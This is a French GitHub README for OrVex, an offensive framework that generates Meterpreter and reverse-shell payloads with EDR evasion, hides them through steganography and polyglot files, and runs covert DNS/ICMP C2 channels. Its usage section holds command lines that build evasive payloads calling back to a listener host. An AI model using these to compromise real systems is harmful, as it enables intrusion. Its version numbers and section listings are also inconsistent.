
**Version 1.9.0** | *Next-Gen Penetration Testing Framework*

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-red)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Kali%20%7C%20Parrot%20%7C%20Ubuntu%20%7C%20Debian-brightgreen)]()
[![Version](https://img.shields.io/badge/Version-2.1.0-success)]()
[![Stars](https://img.shields.io/github/stars/Elfried002/OrVex)](https://github.com/Elfried002/OrVex)


## 📋 **Table des matières**
- [Description](#-description)
- [Fonctionnalités](#-fonctionnalités)
- [Installation](#-installation)
- [Utilisation](#-utilisation)
- [Menu Principal](#-menu-principal)
- [Modules](#-modules)
- [Exemples](#-exemples)
- [Structure du Projet](#-structure-du-projet)
- [Dépendances](#-dépendances)
- [Dépannage](#-dépannage)
- [Contribution](#-contribution)
- [Licence](#-licence)
- [Crédits](#-crédits)


## 🎯 **Description**

**OrVex** (Orbit-al Exploit) est un framework d'exploitation avancé de nouvelle génération, conçu pour les tests d'intrusion professionnels. Il combine des techniques d'évasion EDR modernes avec de la stéganographie multi-format pour créer des payloads indétectables.

Inspiré par **TheFatRat** mais complètement réécrit en Python avec une architecture modulaire, OrVex offre plus de **35 options** pour la génération de payloads, l'évasion, la stéganographie et les communications C2 furtives.

**⚠️ AVERTISSEMENT :** Cet outil est destiné UNIQUEMENT à des fins éducatives et de tests de sécurité autorisés. L'utilisation non autorisée est illégale. Les auteurs ne sont pas responsables des utilisations abusives.


## ✨ **Fonctionnalités**

### 🎯 **Génération de Payloads**
- ✅ **Multi-plateforme** : Windows (x64/x86), Linux (x64/x86), macOS (x64/arm64), Android (ARM/ARM64)
- ✅ **Multi-format** : EXE, DLL, ELF, Mach-O, APK, Python, PowerShell, VBA, C, Go
- ✅ **Meterpreter** : Reverse TCP, HTTPS, HTTP, Bind TCP, Find Tag
- ✅ **Custom** : Payloads personnalisés avec msfvenom, templates personnalisables

### 🛡️ **Évasion EDR (Enterprise Detection & Response)**
- ✅ **Direct Syscalls** : Hell's Gate, Halos Gate, Syswhisper (bypass EDR)
- ✅ **Process Hollowing** : Injection dans processus légitimes (svchost.exe, explorer.exe)
- ✅ **DLL Sideloading** : Proxy DLL, DLL hijacking, search order hijacking
- ✅ **Reflective DLL Injection** : Chargement en mémoire sans WriteProcessMemory
- ✅ **Sandbox Detection** : Anti-VM (VirtualBox, VMware, Hyper-V), anti-debug, sleep evasion
- ✅ **Obfuscation** : XOR, AES-256, RC4, ChaCha20, junk code, polymorphic code

### 📸 **Stéganographie - Image**
- ✅ **LSB (Least Significant Bit)** : Cache dans les bits de poids faible (PNG, BMP)
- ✅ **Bit Plane Slicing** : Cache dans des plans de bits spécifiques (0-7)
- ✅ **DCT (Discrete Cosine Transform)** : Cache dans coefficients JPG (format JPEG)
- ✅ **Analyse de capacité** : Calcule l'espace disponible dans l'image

### 🎵 **Stéganographie - Audio**
- ✅ **LSB Audio** : Cache dans fichiers WAV (16-bit, 44.1kHz)
- ✅ **Echo Hiding** : Cache par modification d'écho (délais variables)
- ✅ **Phase Coding** : Cache dans la phase du signal audio (FFT)

### 📝 **Stéganographie - Texte**
- ✅ **Zero-Width Characters** : Caractères invisibles (ZWSP, ZWNJ, ZWJ, LRM, RLM)
- ✅ **Whitespace Encoding** : Cache dans espaces et tabulations
- ✅ **Détection automatique** : Analyse la présence de caractères invisibles

### 🌐 **Stéganographie - Réseau**
- ✅ **DNS Covert Channel** : Tunnel C2 via requêtes DNS, sous-domaines dynamiques
- ✅ **ICMP Tunneling** : Cache dans paquets ping (Echo Request/Reply)
- ✅ **HTTP Steganography** : Cache dans headers HTTP, cookies, User-Agent

### 📁 **Polyglot Files**
- ✅ **PNG+ZIP** : Image PNG valide contenant une archive ZIP
- ✅ **JPG+EXE** : Image JPG valide contenant un exécutable Windows
- ✅ **PDF+EXE** : Document PDF valide contenant un exécutable
- ✅ **GIF+RAR** : Image GIF valide contenant une archive RAR
- ✅ **Extraction automatique** : Récupération des parties cachées

### 🔧 **Outils & Utilitaires**
- ✅ **Auto Listeners** : Génération fichiers .rc pour Metasploit
- ✅ **Searchsploit** : Intégration Exploit-DB, recherche d'exploits
- ✅ **File Pumper** : Augmentation de taille de fichiers (évasion par taille)
- ✅ **UPX Compression** : Compression de payloads, réduction de taille
- ✅ **Cleanup** : Nettoyage automatique des fichiers temporaires
- ✅ **Configuration** : Profils multiples, sauvegarde des paramètres

## 🚀 **Installation**

### **Prérequis**
- **OS** : Kali Linux, Parrot OS, Ubuntu 20.04+, Debian 11+
- **RAM** : 2 GB minimum, 4 GB recommandé
- **Espace disque** : 5 GB minimum
- **Python** : 3.8 ou supérieur

### **Installation rapide (recommandée)**

# 1. Cloner le dépôt
git clone https://github.com/Elfried002/OrVex.git
cd OrVex

# 2. Rendre le script exécutable
chmod +x setup.sh

# 3. Lancer l'installation (en root)
sudo ./setup.sh

# 4. Lancer OrVex
sudo orvex

### **Installation manuelle**

# 1. Installer les dépendances système
sudo apt update
sudo apt install -y python3 python3-pip python3-venv \
                    metasploit-framework \
                    mingw-w64 \
                    golang \
                    apktool \
                    default-jdk \
                    imagemagick \
                    ffmpeg \
                    sox

# 2. Installer les dépendances Python
pip3 install --upgrade pip
pip3 install -r requirements.txt

# 3. Créer la commande système
sudo ln -s $(pwd)/orvex.py /usr/local/bin/orvex
sudo chmod +x /usr/local/bin/orvex

# 4. Lancer OrVex
sudo orvex

### **Installation sur Windows (Développement)**

# 1. Cloner le dépôt
git clone https://github.com/Elfried002/OrVex.git
cd OrVex

# 2. Créer environnement virtuel
python -m venv .venv
.venv\Scripts\activate

# 3. Installer dépendances
pip install -r requirements.txt

# 4. Lancer en mode développement
python orvex.py --no-root-check

## 🎮 **Utilisation**

### **Mode Interactif (Menu)**

sudo orvex

### **Mode Ligne de Commande**


# Afficher l'aide
orvex --help

# Afficher la version
orvex --version

# Générer un payload Windows x64 Meterpreter
orvex generate --platform windows --arch x64 --type meterpreter \
               --lhost 192.168.1.100 --lport 4444 --output payload.exe

# Générer avec évasion syscalls
orvex generate --platform windows --arch x64 --type reverse_tcp \
               --lhost 192.168.1.100 --lport 4444 \
               --evasion syscall,obfuscate --encrypt AES256 \
               --output loader.exe

# Générer un payload Linux
orvex generate --platform linux --arch x64 --type reverse_tcp \
               --lhost 192.168.1.100 --lport 4444 --format elf \
               --output shell.elf

# Générer un payload Android
orvex generate --platform android --arch arm64 --type meterpreter \
               --lhost 192.168.1.100 --lport 4444 --format apk \
               --output payload.apk


### **Stéganographie**


# Cacher un payload dans une image (LSB)
orvex stego hide --technique image_lsb \
                 --carrier image.png \
                 --payload payload.bin \
                 --output stego_image.png

# Extraire un payload d'une image
orvex stego extract --technique image_lsb \
                    --carrier stego_image.png \
                    --output extracted.bin

# Cacher dans un plan de bits spécifique
orvex stego hide --technique image_bitplane \
                 --carrier image.png \
                 --payload payload.bin \
                 --plane 1 \
                 --output stego_bitplane.png

# Cacher dans un fichier audio
orvex stego hide --technique audio_lsb \
                 --carrier music.wav \
                 --payload payload.bin \
                 --output stego_audio.wav

# Cacher avec echo hiding
orvex stego hide --technique audio_echo \
                 --carrier music.wav \
                 --payload payload.bin \
                 --delay 1.5 --decay 0.3 \
                 --output stego_echo.wav

# Cacher dans du texte (caractères invisibles)
orvex stego hide --technique text_zwc \
                 --carrier cover.txt \
                 --payload secret.txt \
                 --output stego_text.txt

# Créer un polyglotte PNG+ZIP
orvex stego hide --technique polyglot_png_zip \
                 --carrier image.png \
                 --payload archive.zip \
                 --output polyglot.png


### **Vérification des dépendances**


# Vérifier les dépendances
orvex check

# Vérifier et corriger automatiquement
orvex check --fix

# Mode verbeux
orvex check --verbose


### **Configuration**


# Afficher la configuration actuelle
orvex config --show

# Modifier un paramètre
orvex config --set network.default_lhost=10.10.10.10
orvex config --set network.default_lport=5555

# Changer de profil
orvex config --profile stealth

# Créer un nouveau profil
orvex config --profile custom --create --base default

# Réinitialiser la configuration
orvex config --reset

## 🧩 **Modules**

### **Core**
- `banner.py` - Interface utilisateur, ASCII art, menus
- `config.py` - Gestionnaire de configuration YAML, profils
- `engine.py` - Moteur de génération de payloads
- `menu.py` - Système de menu interactif

### **Evasion**
- `syscalls.py` - Direct syscalls (Hell's Gate, Halos Gate)
- `process_hollowing.py` - Process hollowing implementation
- `dll_sideloading.py` - DLL sideloading techniques
- `sandbox_detection.py` - Anti-VM, anti-debug
- `obfuscation.py` - Code obfuscation, XOR, AES

### **Payloads**
- **Windows** : x64 et x86 (reverse_tcp, meterpreter, exec, bind)
- **Linux** : x64 et x86 (reverse_tcp, bind, exec, meterpreter)
- **macOS** : x64 et arm64 (reverse_tcp, exec)
- **Android** : ARM et ARM64 (meterpreter, reverse_tcp)

### **Steganography**
- **Image** : LSB, Bit Plane, DCT
- **Audio** : LSB, Echo Hiding, Phase Coding
- **Text** : Zero-Width Characters, Whitespace
- **Network** : DNS, ICMP, HTTP
- **Polyglot** : PNG+ZIP, JPG+EXE, PDF+EXE

## 📦 **Dépendances**

### **Python**

colorama>=0.4.6;
pyyaml>=6.0.1;
requests>=2.31.0;
cryptography>=41.0.7;
jinja2>=3.1.2;
pillow>=10.1.0;
numpy>=1.24.0,<2.0.0;
opencv-python>=4.8.1;
pycryptodome>=3.19.0;
scapy>=2.5.0;
dnspython>=2.4.0;
pydub>=0.25.1;
scipy>=1.11.0;
soundfile>=0.12.1;
tqdm>=4.66.1;
psutil>=5.9.0

### **Système (Kali/Parrot)**

# Compilation
mingw-w64                    # Cross-compilation Windows
golang                       # Compilation macOS/Go
gcc g++ make                 # Compilation Linux

# Outils
metasploit-framework         # msfvenom, msfconsole
apktool                      # Décompilation Android
default-jdk                  # Signature APK
backdoor-factory              # Backdoor Factory
searchsploit                 # Exploit-DB

# Média
imagemagick                  # Manipulation d'images
ffmpeg                       # Conversion audio/vidéo
sox                          # Manipulation audio

# Réseau
dnsutils                     # nslookup, dig
tcpdump                      # Capture réseau
nmap                         # Scan réseau



## 🔧 **Dépannage**

### **Erreurs courantes**

|              Erreur                  |              Solution                   |
|--------------------------------------|-----------------------------------------|
| `msfvenom not found`                 | `sudo apt install metasploit-framework` |
| `mingw not found`                    | `sudo apt install mingw-w64`            |
| `ImportError: No module named 'cv2'` | `pip install opencv-python`             |
| `Permission denied`                  | `sudo orvex` ou `chmod +x orvex.py`     |
| `No module named 'yaml'`             | `pip install pyyaml`                    |
| `OSError: [Errno 22]`                | `Vérifier l'encodage UTF-8 des fichiers`|

### **Vérification rapide**


# Tester tous les imports
python3 -c "
modules = ['colorama', 'yaml', 'requests', 'cryptography', 'jinja2',
           'PIL', 'numpy', 'Crypto', 'cv2', 'scapy', 'dns', 'pydub']
for m in modules:
    try:
        __import__(m)
        print(f'✓ {m}')
    except ImportError as e:
        print(f'✗ {m}: {e}')
"

### **Réinstallation complète**

# Désinstaller
sudo rm -rf /usr/share/orvex
sudo rm -f /usr/local/bin/orvex
sudo rm -rf /etc/orvex
sudo rm -rf /var/lib/orvex
rm -rf ~/.orvex

# Réinstaller
cd OrVex
sudo ./setup.sh


## 🤝 **Contribution**

Les contributions sont les bienvenues ! Voici comment contribuer :

1. **Fork** le projet
2. **Créez** votre branche (`git checkout -b feature/AmazingFeature`)
3. **Commit** vos changements (`git commit -m 'Add AmazingFeature'`)
4. **Push** vers la branche (`git push origin feature/AmazingFeature`)
5. **Ouvrez** une Pull Request

### **Règles de contribution**
- Suivez les conventions PEP8 pour Python
- Documentez les nouvelles fonctionnalités
- Ajoutez des tests unitaires si possible
- Mettez à jour la documentation


## 📜 **Licence**

Ce projet est sous licence **MIT**. Voir le fichier [LICENSE](LICENSE) pour plus de détails.

MIT License

Copyright (c) 2026 3lfr13d (Elfried)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files...


## ⚠️ **Avertissement Légal**

**OrVex est un outil de test d'intrusion. Son utilisation contre des systèmes sans autorisation explicite est ILLÉGALE.**

- ✅ **Usage autorisé** : Tests d'intrusion sur vos propres systèmes, CTF, laboratoires, éducation
- ❌ **Usage interdit** : Systèmes sans autorisation, cybercriminalité, malware

Les auteurs ne sont pas responsables des utilisations abusives. Vous êtes seul responsable de la conformité de vos actions avec les lois applicables dans votre juridiction.

## 🙏 **Crédits**

### **Créateur**
- **3lfr13d** (Elfried) - Développeur principal
- **GitHub** : [@Elfried002](https://github.com/Elfried002)

### **Remerciements**
- **Screetsec** - Pour TheFatRat, qui a inspiré ce projet
- **Dracos Linux Community** - Pour le support et les tests
- **Offensive Security** - Pour Kali Linux et Metasploit
- **Tous les contributeurs** - Qui ont aidé à améliorer OrVex

### **Outils utilisés**
- Metasploit Framework
- MinGW-w64
- OpenCV
- PyCryptodome
- Scapy

## 📞 **Contact & Support**

- **GitHub** : [https://github.com/Elfried002/OrVex](https://github.com/Elfried002/OrVex)
- **Issues** : [https://github.com/Elfried002/OrVex/issues](https://github.com/Elfried002/OrVex/issues)
- **Discussions** : [https://github.com/Elfried002/OrVex/discussions](https://github.com/Elfried002/OrVex/discussions)
- **Email** : elfriedyobouet@gmail.com
- **Site Web** : https://elfried-yobouet.siteviral.com


## ⭐ **Supportez le projet**

Si OrVex vous est utile, n'oubliez pas de **mettre une étoile** ⭐ sur GitHub !

# Cloner et soutenir
git clone https://github.com/Elfried002/OrVex.git
cd OrVex
# ⭐ Cliquez sur l'étoile en haut de la page GitHub !


**Made with ❤️ by 3lfr13d** | **Dernière mise à jour : Février 2026**


*"The quieter you become, the more you are able to hear."* - Kali Linux

## 📋 **RÉSUMÉ DU README.md**

|      Section        |                   Contenu                       |
|---------------------|-------------------------------------------------|
| **Description**     | Présentation du framework, avertissement légal  |
| **Fonctionnalités** | Liste complète des 35+ options                  |
| **Installation**    | Instructions pour Kali, Parrot, Ubuntu, Windows |
| **Utilisation**     | Commandes CLI détaillées, exemples              |
| **Menu Principal**  | Capture du menu avec toutes les options         |
| **Modules**         | Description de chaque module                    |
| **Structure**       | Arborescence complète du projet                 |
| **Dépendances**     | Liste Python et système                         |
| **Dépannage**       | Solutions aux erreurs courantes                 |
| **Contribution**    | Guide pour contribuer                           |
| **Licence**         | MIT License                                     |
| **Crédits**         | Remerciements et contact                        |
